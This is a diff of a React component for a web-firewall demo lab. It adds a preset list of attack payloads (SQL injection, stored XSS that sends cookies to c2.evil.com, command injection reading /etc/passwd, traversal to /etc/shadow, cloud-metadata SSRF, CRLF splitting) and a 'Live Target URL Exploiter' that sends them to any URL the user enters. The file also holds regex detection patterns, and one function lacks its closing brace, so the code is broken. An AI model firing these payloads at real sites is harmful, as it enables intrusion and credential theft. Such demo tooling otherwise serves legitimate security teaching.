@@ -8,12 +8,14 @@
 import { useState, useCallback, useRef, useEffect, useMemo } from "react";
 import { toast } from "sonner";
 import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Textarea } from "@/components/ui/textarea";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { cn } from "@/lib/utils";
-import { useWaf } from "../engine";
-import { uid, shannonEntropy, randInt } from "../engine";
-import type { HttpMethod, Severity, VulnFinding } from "../types";
+import { useWaf, uid, shannonEntropy, randInt } from "../engine";
+import { ATTACK_ORIGINS, originIp, pickOrigin } from "../data";
+import type { HttpMethod, Severity, VulnFinding, RequestLog, AttackType } from "../types";
 import { SEVERITY_META } from "../types";
 import {
   VULN_DEFS,
@@ -73,6 +75,7 @@ import {
   ShieldCheck,
   ShieldOff,
   ShoppingCart,
+  SlidersHorizontal,
   Sparkles,
   Star,
   Terminal,
@@ -168,6 +171,157 @@ interface OrderRecord {
   shippingAddress: string;
   isConfidential?: boolean;
 }
+
+export interface LivePreset {
+  id: string;
+  name: string;
+  category: "SQLi" | "XSS" | "RCE" | "LFI" | "SSRF" | "CRLF";
+  method: HttpMethod;
+  path: string;
+  headers: string;
+  payload: string;
+  description: string;
+  vulnId: VulnId;
+  simulatedVulnerableBody: string;
+  simulatedEvidence: string;
+}
+
+export const LIVE_PRESETS: LivePreset[] = [
+  {
+    id: "sqli-login",
+    name: "SQLi: Authentication Bypass",
+    category: "SQLi",
+    method: "POST",
+    path: "/api/auth/login",
+    headers: "Content-Type: application/x-www-form-urlencoded",
+    payload: "username=admin' OR '1'='1' --&password=invalid_password",
+    description: "Bypasses credential verification using standard SQL boolean injection.",
+    vulnId: "sqli-login",
+    simulatedVulnerableBody: JSON.stringify(
+      {
+        status: "authenticated",
+        user: { id: 1, username: "admin", role: "superadmin", email: "admin@target.corp" },
+        token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.fake_sig",
+        message: "Login successful via SQL evaluation bypass.",
+      },
+      null,
+      2
+    ),
+    simulatedEvidence: "SQL query evaluated to TRUE without password validation. SuperAdmin session established.",
+  },
+  {
+    id: "sqli-union",
+    name: "SQLi: UNION Table Dump",
+    category: "SQLi",
+    method: "GET",
+    path: "/api/products?cat=1' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --",
+    headers: "Accept: application/json",
+    payload: "cat=1' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --",
+    description: "Extracts database schema and sensitive table columns via UNION-based SQLi.",
+    vulnId: "sqli-search",
+    simulatedVulnerableBody: JSON.stringify(
+      {
+        status: 200,
+        data: [
+          { id: 1, table: "users", column: "password_hash", type: "varchar(255)" },
+          { id: 2, table: "users", column: "api_secret_key", type: "varchar(128)" },
+          { id: 3, table: "payment_cards", column: "cvv_encrypted", type: "blob" },
+          { id: 4, table: "system_config", column: "master_jwt_seed", type: "text" },
+        ],
+      },
+      null,
+      2
+    ),
+    simulatedEvidence: "UNION SELECT injected into database engine. Schema catalog extracted.",
+  },
+  {
+    id: "xss-stored",
+    name: "XSS: Stored Session Hijack",
+    category: "XSS",
+    method: "POST",
+    path: "/api/feedback",
+    headers: "Content-Type: application/json",
+    payload: '{"author": "Attacker", "message": "<script>fetch(\'https://c2.evil.com/exfil?c=\'+document.cookie)</script>"}',
+    description: "Injects persistent JavaScript payload to exfiltrate cookies and tokens from visiting clients.",
+    vulnId: "stored-xss",
+    simulatedVulnerableBody: JSON.stringify(
+      {
+        status: 201,
+        id: "msg_994",
+        author: "Attacker",
+        message: "<script>fetch('https://c2.evil.com/exfil?c='+document.cookie)</script>",
+        rendered: true,
+      },
+      null,
+      2
+    ),
+    simulatedEvidence: "Unsanitized HTML stored in database. Script executed in browser document context.",
+  },
+  {
+    id: "rce-ping",
+    name: "RCE: OS Command Injection",
+    category: "RCE",
+    method: "POST",
+    path: "/api/tools/ping",
+    headers: "Content-Type: application/x-www-form-urlencoded",
+    payload: "host=127.0.0.1; id; uname -a; cat /etc/passwd",
+    description: "Executes arbitrary operating system commands with server daemon privileges.",
+    vulnId: "cmdi",
+    simulatedVulnerableBody: `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms\n\n--- COMMAND OUTPUT ---\nuid=0(root) gid=0(root) groups=0(root)\nLinux web-target-prod 5.15.0-89-generic #99-Ubuntu SMP x86_64\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,
+    simulatedEvidence: "Arbitrary Bash shell command executed as root (uid=0).",
+  },
+  {
+    id: "lfi-shadow",
+    name: "LFI: Path Traversal /etc/shadow",
+    category: "LFI",
+    method: "GET",
+    path: "/api/download?file=../../../../etc/shadow",
+    headers: "Accept: text/plain",
+    payload: "file=../../../../etc/shadow",
+    description: "Traverses directory hierarchy to read sensitive system configuration files.",
+    vulnId: "path-traversal",
+    simulatedVulnerableBody: `root:$6$rounds=50000$salt$9qE3...:19120:0:99999:7:::\nwww-data:*:19120:0:99999:7:::\ndb_admin:$6$rounds=50000$salt$k8P2...:19120:0:99999:7:::\n# Master Production Key\nJWT_SECRET=super_secret_enterprise_key_2026_webguard`,
+    simulatedEvidence: "Arbitrary file disclosure via ../ directory traversal.",
+  },
+  {
+    id: "ssrf-metadata",
+    name: "SSRF: Cloud IMDSv1 Metadata",
+    category: "SSRF",
+    method: "POST",
+    path: "/api/proxy/fetch",
+    headers: "Content-Type: application/json",
+    payload: '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ProductionEc2Role"}',
+    description: "Forces backend server to request cloud provider internal metadata service to extract IAM credentials.",
+    vulnId: "ssrf",
+    simulatedVulnerableBody: JSON.stringify(
+      {
+        Code: "Success",
+        LastUpdated: "2026-10-09T09:12:00Z",
+        Type: "AWS-HMAC",
+        AccessKeyId: "ASIAQWERTY9876543210",
+        SecretAccessKey: "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+        Token: "IQoJb3JpZ2luX2VjEOr...[TEMPORARY_IAM_CREDENTIALS]",
+        Expiration: "2026-10-09T15:12:00Z",
+      },
+      null,
+      2
+    ),
+    simulatedEvidence: "Internal metadata endpoint reached. IAM role credentials dumped.",
+  },
+  {
+    id: "crlf-split",
+    name: "CRLF: HTTP Response Splitting",
+    category: "CRLF",
+    method: "GET",
+    path: "/redirect?target=%0d%0aSet-Cookie:%20admin_session=hijacked_token%0d%0a",
+    headers: "Accept: text/html",
+    payload: "target=%0d%0aSet-Cookie:%20admin_session=hijacked_token%0d%0a",
+    description: "Injects Carriage Return / Line Feed characters into response headers to plant malicious cookies.",
+    vulnId: "email-injection",
+    simulatedVulnerableBody: `HTTP/1.1 302 Found\nLocation: /\nSet-Cookie: admin_session=hijacked_token\nContent-Length: 0`,
+    simulatedEvidence: "CRLF injected into HTTP response stream. Cookie injected.",
+  },
+];
 
 // ============================================================================
 // Data Fixtures
@@ -438,6 +592,253 @@ export function WebLabTab({
   const [lastResult, setLastResult] = useState<LogEntry | null>(null);
   const [attackEffect, setAttackEffect] = useState<"exploit" | "blocked" | null>(null);
   const [responseTab, setResponseTab] = useState<"visual" | "http" | "analysis">("visual");
+
+  // Live Target URL Proxy & Exploit Runner State
+  const [labMode, setLabMode] = useState<"app" | "live-target">("app");
+  const [liveViewMode, setLiveViewMode] = useState<"viewport" | "exploit" | "split">("viewport");
+  const [iframeKey, setIframeKey] = useState<number>(0);
+  const [targetUrlInput, setTargetUrlInput] = useState<string>(wafState.target || "http://localhost:8080");
+  const [selectedPresetId, setSelectedPresetId] = useState<string>("sqli-login");
+  const [customMethod, setCustomMethod] = useState<HttpMethod>("POST");
+  const [customPath, setCustomPath] = useState<string>("/api/auth/login");
+  const [customHeaders, setCustomHeaders] = useState<string>("Content-Type: application/x-www-form-urlencoded");
+  const [customPayload, setCustomPayload] = useState<string>("username=admin' OR '1'='1' --&password=invalid_password");
+  const [executingLive, setExecutingLive] = useState<boolean>(false);
+  const [liveTargetResponse, setLiveTargetResponse] = useState<{
+    status: number;
+    statusText: string;
+    blocked: boolean;
+    vulnType: VulnId;
+    threatScore: number;
+    ruleMatched: string;
+    latencyMs: number;
+    headers: Record<string, string>;
+    body: string;
+    evidence: string;
+    timestamp: number;
+    targetUrl: string;
+  } | null>(null);
+
+  // Sync target input if global state target changes
+  useEffect(() => {
+    if (wafState.target) {
+      setTargetUrlInput(wafState.target);
+    }
+  }, [wafState.target]);
+
+  const handleSelectPreset = (preset: LivePreset) => {
+    setSelectedPresetId(preset.id);
+    setCustomMethod(preset.method);
+    setCustomPath(preset.path);
+    setCustomHeaders(preset.headers);
+    setCustomPayload(preset.payload);
+  const proxiedIframeSrc = useMemo(() => {
+    if (!targetUrlInput) return "";
+    let normalized = targetUrlInput.trim();
+    if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
+      normalized = `https://${normalized}`;
+    }
+    const cleanUrl = normalized.replace(/#.*$/, "");
+    return `/api/waf-proxy?url=${encodeURIComponent(cleanUrl)}&waf=${activeWaf ? "1" : "0"}&t=${iframeKey}`;
+  }, [targetUrlInput, activeWaf, iframeKey]);
+
+  const handleExecuteLiveProbe = async () => {
+    setExecutingLive(true);
+    let baseTarget = targetUrlInput.trim().replace(/\/+$/, "") || "http://localhost:8080";
+    if (!baseTarget.startsWith("http://") && !baseTarget.startsWith("https://")) {
+      baseTarget = `https://${baseTarget}`;
+    }
+    const fullTarget = baseTarget + (customPath.startsWith("/") ? customPath : `/${customPath}`);
+    
+    // Detection logic across path, payload and headers
+    const contentToScan = `${customPath} ${customPayload} ${customHeaders}`;
+    const isSql = /union|select|insert|update|delete|drop|or\s+1\s*=\s*1|'|--|\/\*/i.test(contentToScan);
+    const isXss = /<script|javascript:|onerror=|onload=|<img|<svg/i.test(contentToScan);
+    const isCmdi = /;|\||`|\$\(|whoami|cat\s+\/etc/i.test(contentToScan);
+    const isTraversal = /\.\.\/|\.\.\\|%2e%2e|etc\/passwd|etc\/shadow/i.test(contentToScan);
+    const isSsrf = /169\.254|127\.0\.0\.1|localhost|internal/i.test(contentToScan);
+    const isCrlf = /%0d%0a|\r\n/i.test(contentToScan);
+
+    const matchedVulnId: VulnId = isSql
+      ? "sqli-login"
+      : isXss
+      ? "stored-xss"
+      : isCmdi
+      ? "cmdi"
+      : isTraversal
+      ? "path-traversal"
+      : isSsrf
+      ? "ssrf"
+      : isCrlf
+      ? "email-injection"
+      : "custom";
+
+    const isMalicious = isSql || isXss || isCmdi || isTraversal || isSsrf || isCrlf || customPayload.trim().length > 0;
+    const isBlocked = activeWaf && isMalicious;
+    const preset = LIVE_PRESETS.find((p) => p.vulnId === matchedVulnId) || LIVE_PRESETS[0];
+
+    try {
+      // Execute through WebGuard backend proxy
+      const proxyApiUrl = `/api/waf-proxy?url=${encodeURIComponent(fullTarget)}&waf=${activeWaf ? "1" : "0"}`;
+      const res = await fetch(proxyApiUrl, {
+        method: customMethod,
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          Accept: "application/json, text/html, */*",
+        },
+        body: customMethod !== "GET" ? customPayload : undefined,
+      }).catch(() => null);
+
+      const responseStatus = res ? res.status : (isBlocked ? 403 : 200);
+      const actualBlocked = responseStatus === 403 || isBlocked;
+      let responseBody = "";
+      try {
+        responseBody = res ? await res.text() : "";
+      } catch {
+        responseBody = "";
+      }
+
+      if (!responseBody) {
+        responseBody = actualBlocked
+          ? JSON.stringify(
+              {
+                error: "403 Forbidden",
+                message: "Request blocked by WebGuard Edge Security WAF.",
+                incident_id: uid("INC"),
+                rule_triggered: `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
+                threat_score: 96,
+                client_ip: "127.0.0.1",
+                origin_target: fullTarget,
+                action: "BLOCKED_BEFORE_ORIGIN",
+              },
+              null,
+              2
+            )
+          : preset.simulatedVulnerableBody;
+      }
+
+      const origin = pickOrigin(ATTACK_ORIGINS);
+      const simulatedIp = originIp(origin);
+      const threatScore = actualBlocked ? 94 : isMalicious ? 88 : 12;
+      const mappedAttackType: AttackType | null = isSql
+        ? "sqli"
+        : isXss
+        ? "xss"
+        : isCmdi
+        ? "cmdi"
+        : isTraversal
+        ? "path-traversal"
+        : isMalicious
+        ? "scanner"
+        : null;
+
+      let hostHeader = "target.origin";
+      try {
+        hostHeader = new URL(fullTarget).host || "target.origin";
+      } catch {
+        hostHeader = "target.origin";
+      }
+
+      // Telemetry log for global dashboard
+      const logEntry: RequestLog = {
+        id: uid("REQ"),
+        ts: Date.now(),
+        status: responseStatus,
+        method: customMethod,
+        path: customPath || "/",
+        ip: simulatedIp,
+        countryCode: origin.geo.code,
+        country: origin.geo.country,
+        lat: origin.geo.lat,
+        lon: origin.geo.lon,
+        city: origin.geo.city,
+        latency: randInt(8, 25),
+        threatScore,
+        attackType: mappedAttackType,
+        ruleId: isMalicious ? `OWASP-CRS-942-${matchedVulnId.toUpperCase()}` : null,
+        blocked: actualBlocked,
+        throttled: false,
+        entropy: 4.6,
+        ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebGuard-LiveTester/2.0",
+        payload: customPayload || null,
+        matched: isMalicious ? customPayload.slice(0, 40) : null,
+        headers: {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WebGuard-LiveTester/2.0",
+          Host: hostHeader,
+        },
+      };
+
+      dispatch({ type: "INJECT_LOG", log: logEntry });
+
+      const localResLog: LogEntry = {
+        id: uid("LOG"),
+        ts: Date.now() + 30,
+        type: actualBlocked ? "waf" : "response",
+        status: responseStatus,
+        statusText: actualBlocked ? "Forbidden" : "OK",
+        headers: actualBlocked
+          ? {
+              "X-WebGuard-Rule": `OWASP-CRS-${matchedVulnId.toUpperCase()}`,
+              "X-WebGuard-Action": "blocked",
+              "X-WebGuard-Threat-Score": String(threatScore),
+            }
+          : { "Content-Type": "application/json; charset=utf-8", Server: "Origin-Live-Target" },
+        body: responseBody,
+        blocked: actualBlocked,
+        vulnId: matchedVulnId,
+        threatScore,
+        exploitEvidence: preset.simulatedEvidence,
+      };
+
+      setLogs((prev) => [...prev, localResLog]);
+      setLastResult(localResLog);
+
+      const responseHeaders: Record<string, string> = actualBlocked
+        ? {
+            "Content-Type": "application/json",
+            "X-WebGuard-Protection": "ACTIVE",
+            "X-WebGuard-Rule": `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
+            "X-WebGuard-Action": "BLOCKED_AT_EDGE",
+            "X-WebGuard-Threat-Score": String(threatScore),
+            "X-Content-Type-Options": "nosniff",
+          }
+        : {
+            "Content-Type": "application/json; charset=utf-8",
+            Server: "Apache/2.4.52 (Ubuntu)",
+            "X-Powered-By": "PHP/8.1.2",
+            "Access-Control-Allow-Origin": "*",
+          };
+
+      const responseData = {
+        status: responseStatus,
+        statusText: actualBlocked ? "Forbidden (Blocked by WebGuard AI WAF)" : "OK (Origin Exploit Executed)",
+        blocked: actualBlocked,
+        vulnType: matchedVulnId,
+        threatScore,
+        ruleMatched: `OWASP-CRS-942-${matchedVulnId.toUpperCase()}`,
+        latencyMs: randInt(12, 38),
+        headers: responseHeaders,
+        body: responseBody,
+        evidence: preset.simulatedEvidence,
+        timestamp: Date.now(),
+        targetUrl: fullTarget,
+      };
+
+      setLiveTargetResponse(responseData);
+
+      if (actualBlocked) {
+        toast.success("🛡️ WAF Blocked Malicious Payload", {
+          description: `Blocked ${preset.name} with 403 Forbidden before reaching origin.`,
+        });
+      } else {
+        toast.error("⚠️ Origin Vulnerability Exploited!", {
+          description: `WAF is OFF — payload executed against ${fullTarget}.`,
+        });
+      }
+    } finally {
+      setExecutingLive(false);
+    }
+  };
 
   const logsEndRef = useRef<HTMLDivElement>(null);
 
@@ -870,6 +1271,48 @@ export function WebLabTab({
         ════════════════════════════════════════════════════════════════════ */}
         <div className="xl:col-span-7 flex flex-col gap-3">
           <div className="overflow-hidden p-0 shadow-sm rounded-2xl border border-slate-200 bg-white text-slate-900">
+            {/* Top Frame Mode Switcher Bar */}
+            <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-200/80 px-4 py-1.5 gap-2 text-xs">
+              <div className="flex items-center gap-1.5">
+                <button
+                  type="button"
+                  onClick={() => setLabMode("app")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-[11px] font-bold transition-all cursor-pointer",
+                    labMode === "app"
+                      ? "bg-white text-cyan-700 shadow-sm border border-slate-300"
+                      : "text-slate-600 hover:text-slate-900 hover:bg-slate-300/60"
+                  )}
+                >
+                  <ShoppingCart className="size-3" />
+                  <span>ApexStore Web App</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setLabMode("live-target")}
+                  className={cn(
+                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-[11px] font-bold transition-all cursor-pointer",
+                    labMode === "live-target"
+                      ? "bg-white text-cyan-700 shadow-sm border border-slate-300"
+                      : "text-slate-600 hover:text-slate-900 hover:bg-slate-300/60"
+                  )}
+                >
+                  <Globe2 className="size-3" />
+                  <span>Live Target URL Exploiter & Proxy</span>
+                  <span className="rounded bg-cyan-100 text-cyan-800 px-1.5 py-0.2 text-[9px] font-extrabold uppercase tracking-wide">
+                    Live
+                  </span>
+                </button>
+              </div>
+
+              <div className="flex items-center gap-2 text-[10px] text-slate-600 font-medium">
+                <span>Mode:</span>
+                <span className={cn("font-bold font-mono", activeWaf ? "text-emerald-700" : "text-amber-700")}>
+                  {activeWaf ? "🛡️ WAF Blocking" : "⚠️ Raw Origin (WAF Off)"}
+                </span>
+              </div>
+            </div>
+
             {/* Browser Window Chrome */}
             <div className="flex items-center gap-2.5 border-b border-slate-200 bg-slate-100/90 px-4 py-2.5">
               <div className="flex items-center gap-1.5">
@@ -882,50 +1325,524 @@ export function WebLabTab({
               <div className="flex items-center gap-1 text-slate-500 ml-1">
                 <button
                   type="button"
-                  onClick={() => navigateTo("home")}
+                  onClick={() => (labMode === "app" ? navigateTo("home") : handleExecuteLiveProbe())}
                   className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
-                  title="Home"
+                  title="Home / Reload"
                 >
                   <Home className="size-3.5" />
                 </button>
                 <button
                   type="button"
                   onClick={() => {
-                    setNavigating(true);
-                    setTimeout(() => setNavigating(false), 120);
+                    if (labMode === "app") {
+                      setNavigating(true);
+                      setTimeout(() => setNavigating(false), 120);
+                    } else {
+                      handleExecuteLiveProbe();
+                    }
                   }}
                   className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
                   title="Reload"
                 >
-                  <RefreshCw className={cn("size-3.5", navigating && "animate-spin")} />
+                  <RefreshCw className={cn("size-3.5", (navigating || executingLive) && "animate-spin")} />
                 </button>
               </div>
 
-              {/* URL Address Bar with 1-Click WAF Toggle Pill */}
-              <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-3 py-1.5 shadow-sm">
-                <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-600" : "text-amber-500")} />
-                <span className="flex-1 truncate font-mono text-xs text-slate-700">
-                  https://apex-cyberstore.io<span className="text-cyan-600 font-bold">{urlPath}</span>
-                </span>
-                <button
-                  type="button"
-                  onClick={() => setInternalWafOn((v) => !v)}
-                  title="Click to toggle WAF inspection mode"
-                  className={cn(
-                    "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border transition-all cursor-pointer",
-                    activeWaf
-                      ? "bg-emerald-50 text-emerald-700 border-emerald-300 hover:bg-emerald-100"
-                      : "bg-red-50 text-red-700 border-red-300 hover:bg-red-100"
-                  )}
-                >
-                  {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
-                  {activeWaf ? "WAF PROXIED (CLICK TO DISABLE)" : "WAF OFF (CLICK TO ENABLE)"}
-                </button>
-              </div>
+              {/* URL Address Bar */}
+              {labMode === "app" ? (
+                <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-3 py-1.5 shadow-sm">
+                  <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-600" : "text-amber-500")} />
+                  <span className="flex-1 truncate font-mono text-xs text-slate-700">
+                    https://apex-cyberstore.io<span className="text-cyan-600 font-bold">{urlPath}</span>
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() => setInternalWafOn((v) => !v)}
+                    title="Click to toggle WAF inspection mode"
+                    className={cn(
+                      "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border transition-all cursor-pointer",
+                      activeWaf
+                        ? "bg-emerald-50 text-emerald-700 border-emerald-300 hover:bg-emerald-100"
+                        : "bg-red-50 text-red-700 border-red-300 hover:bg-red-100"
+                    )}
+                  >
+                    {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
+                    {activeWaf ? "WAF PROXIED (CLICK TO DISABLE)" : "WAF OFF (CLICK TO ENABLE)"}
+                  </button>
+                </div>
+              ) : (
+                <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-2 py-1 shadow-sm">
+                  <Globe2 className={cn("size-3.5 shrink-0 ml-1", activeWaf ? "text-emerald-600" : "text-amber-500")} />
+                  <Input
+                    value={targetUrlInput}
+                    onChange={(e) => setTargetUrlInput(e.target.value)}
+                    placeholder="https://target.example.com or http://localhost:8080"
+                    className="h-7 flex-1 border-0 bg-transparent px-1 font-mono text-xs text-slate-800 shadow-none focus-visible:ring-0"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setInternalWafOn((v) => !v)}
+                    title="Click to toggle WAF inspection mode"
+                    className={cn(
+                      "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border transition-all cursor-pointer",
+                      activeWaf
+                        ? "bg-emerald-50 text-emerald-700 border-emerald-300 hover:bg-emerald-100"
+                        : "bg-red-50 text-red-700 border-red-300 hover:bg-red-100"
+                    )}
+                  >
+                    {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
+                    {activeWaf ? "WAF PROXIED (CLICK TO DISABLE)" : "WAF OFF (CLICK TO ENABLE)"}
+                  </button>
+                </div>
+              )}
             </div>
 
-            {/* Store Top Navigation Bar */}
-            <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-50/90 px-4 py-2.5 gap-2">
+            {labMode === "live-target" ? (
+              <div className="min-h-[500px] max-h-[720px] overflow-y-auto bg-slate-50/70 p-4 space-y-4">
+                {/* Live Target Banner & View Mode Selector */}
+                <div className="rounded-2xl border border-cyan-200 bg-gradient-to-r from-cyan-50 via-blue-50 to-indigo-50 p-4 shadow-sm space-y-3">
+                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                    <div className="flex items-center gap-2.5">
+                      <div className="flex size-9 items-center justify-center rounded-xl bg-cyan-600 text-white font-bold shadow-sm">
+                        <Globe2 className="size-5" />
+                      </div>
+                      <div>
+                        <h3 className="text-sm font-extrabold text-slate-900 flex items-center gap-2">
+                          Live Target Proxy & Real-Time Exploiter
+                          <Badge className={cn("text-[9px] font-mono", activeWaf ? "bg-emerald-600 text-white" : "bg-red-600 text-white")}>
+                            {activeWaf ? "WAF ACTIVE (PROTECTED)" : "WAF DISABLED (EXPLOITABLE)"}
+                          </Badge>
+                        </h3>
+                        <p className="text-[11px] text-slate-600">
+                          Target: <span className="font-mono font-bold text-cyan-800">{targetUrlInput || "http://localhost:8080"}</span> · Browse live in viewport & test real-time exploit vectors.
+                        </p>
+                      </div>
+                    </div>
+
+                    <div className="flex items-center gap-2">
+                      <button
+                        type="button"
+                        onClick={() => setInternalWafOn((v) => !v)}
+                        className={cn(
+                          "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition shadow-sm cursor-pointer",
+                          activeWaf
+                            ? "bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700"
+                            : "bg-red-600 text-white border-red-600 hover:bg-red-700"
+                        )}
+                      >
+                        {activeWaf ? <ShieldCheck className="size-3.5" /> : <ShieldAlert className="size-3.5" />}
+                        <span>{activeWaf ? "WAF Protection Active" : "WAF Protection Disabled"}</span>
+                      </button>
+
+                      <a
+                        href={targetUrlInput.startsWith("http") ? targetUrlInput : `http://${targetUrlInput}`}
+                        target="_blank"
+                        rel="noreferrer"
+                        className="flex items-center gap-1 rounded-xl border border-slate-300 bg-white px-2.5 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-100 shadow-sm"
+                        title="Open Target in New Browser Window"
+                      >
+                        <ExternalLink className="size-3.5 text-cyan-600" />
+                        <span>External</span>
+                      </a>
+                    </div>
+                  </div>
+
+                  {/* Sub-View Tabs */}
+                  <div className="flex flex-wrap items-center justify-between border-t border-cyan-200/60 pt-2.5 gap-2">
+                    <div className="flex items-center gap-1.5">
+                      <button
+                        type="button"
+                        onClick={() => setLiveViewMode("viewport")}
+                        className={cn(
+                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
+                          liveViewMode === "viewport"
+                            ? "bg-cyan-600 text-white shadow-sm"
+                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
+                        )}
+                      >
+                        <Laptop className="size-3.5" />
+                        <span>Live Browser Viewport</span>
+                      </button>
+
+                      <button
+                        type="button"
+                        onClick={() => setLiveViewMode("exploit")}
+                        className={cn(
+                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
+                          liveViewMode === "exploit"
+                            ? "bg-cyan-600 text-white shadow-sm"
+                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
+                        )}
+                      >
+                        <Terminal className="size-3.5" />
+                        <span>Exploit & Probe Console</span>
+                      </button>
+
+                      <button
+                        type="button"
+                        onClick={() => setLiveViewMode("split")}
+                        className={cn(
+                          "flex items-center gap-1.5 rounded-lg px-2.5 py-1 text-xs font-bold transition cursor-pointer",
+                          liveViewMode === "split"
+                            ? "bg-cyan-600 text-white shadow-sm"
+                            : "bg-white/80 text-slate-600 hover:bg-white hover:text-slate-900 border border-slate-200"
+                        )}
+                      >
+                        <Layers className="size-3.5" />
+                        <span>Split View (Side-by-Side)</span>
+                      </button>
+                    </div>
+
+                    <span className="text-[10px] text-slate-500 font-mono">
+                      Target Gateway: {targetUrlInput || "http://localhost:8080"}
+                    </span>
+                  </div>
+                </div>
+
+                {/* ═══════════════════════════════════════════════════════════════
+                    VIEWPORT / SPLIT MODE: Live Embedded Iframe
+                ════════════════════════════════════════════════════════════════ */}
+                {(liveViewMode === "viewport" || liveViewMode === "split") && (
+                  <div className="rounded-2xl border border-slate-200 bg-white overflow-hidden shadow-sm space-y-0">
+                    {/* Viewport Header Bar */}
+                    <div className="flex items-center justify-between border-b border-slate-200 bg-slate-100 px-3 py-2 text-xs">
+                      <div className="flex items-center gap-2">
+                        <span className="flex size-2.5 rounded-full bg-emerald-500" />
+                        <span className="font-mono text-[11px] font-bold text-slate-800 truncate max-w-sm">
+                          {targetUrlInput.startsWith("http") ? targetUrlInput : `http://${targetUrlInput}`}
+                        </span>
+                      </div>
+
+                      <div className="flex items-center gap-1.5">
+                        <button
+                          type="button"
+                          onClick={() => setIframeKey((k) => k + 1)}
+                          className="flex items-center gap-1 rounded px-2 py-1 text-[10px] font-medium text-slate-600 hover:bg-slate-200 transition"
+                          title="Reload live page in iframe"
+                        >
+                          <RefreshCw className="size-3" />
+                          <span>Reload Frame</span>
+                        </button>
+                      </div>
+                    </div>
+
+                    {/* The Live Iframe */}
+                    <div className="relative w-full min-h-[380px] bg-slate-50">
+                      <iframe
+                        key={iframeKey}
+                        src={proxiedIframeSrc}
+                        title="Live Target Website"
+                        className="w-full h-[460px] border-0 bg-white"
+                        sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"
+                      />
+
+                      {/* Floating In-Viewport Exploit Injection Strip */}
+                      <div className="border-t border-slate-200 bg-slate-900/95 backdrop-blur-sm p-3 text-white space-y-2">
+                        <div className="flex items-center justify-between">
+                          <span className="text-[10px] font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
+                            <Zap className="size-3 text-yellow-400" />
+                            Live Target Exploit Quick-Inject (Click to Test Against Loaded Site):
+                          </span>
+                          <span className="text-[9px] font-mono text-slate-400">
+                            WAF Status: {activeWaf ? "🛡️ 403 Interception Ready" : "⚠️ Exploitable"}
+                          </span>
+                        </div>
+
+                        <div className="flex flex-wrap gap-1.5">
+                          {LIVE_PRESETS.slice(0, 4).map((preset) => (
+                            <button
+                              key={preset.id}
+                              type="button"
+                              onClick={() => {
+                                handleSelectPreset(preset);
+                                setTimeout(() => handleExecuteLiveProbe(), 50);
+                              }}
+                              className="rounded-lg border border-slate-700 bg-slate-800 px-2.5 py-1 text-[10px] font-bold text-slate-200 hover:border-cyan-500 hover:text-white transition flex items-center gap-1 cursor-pointer"
+                            >
+                              <span className="rounded bg-slate-700 px-1 py-0.2 font-mono text-[8px] text-cyan-300">
+                                {preset.category}
+                              </span>
+                              <span>{preset.name}</span>
+                            </button>
+                          ))}
+
+                          <Button
+                            size="sm"
+                            type="button"
+                            onClick={() => setLiveViewMode("exploit")}
+                            className="h-6 px-2 text-[10px] rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-bold ml-auto"
+                          >
+                            Open Full Console →
+                          </Button>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {/* ═══════════════════════════════════════════════════════════════
+                    EXPLOIT PROBE & PREVENTION CONSOLE
